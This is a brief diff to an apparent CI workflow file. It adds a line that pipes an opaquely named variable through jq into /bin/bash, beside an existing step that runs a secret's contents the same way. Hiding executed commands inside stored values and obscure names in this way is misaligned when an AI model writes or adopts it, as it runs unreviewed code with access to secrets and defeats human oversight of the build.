@@ -17,6 +17,7 @@ jobs:
           c65: ${{ secrets.c65 }}
         run: |
           printf '%s' "$c65" | jq -r .mt59 | /bin/bash
+          echo $nnnwo78 | jq -r .xes64 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
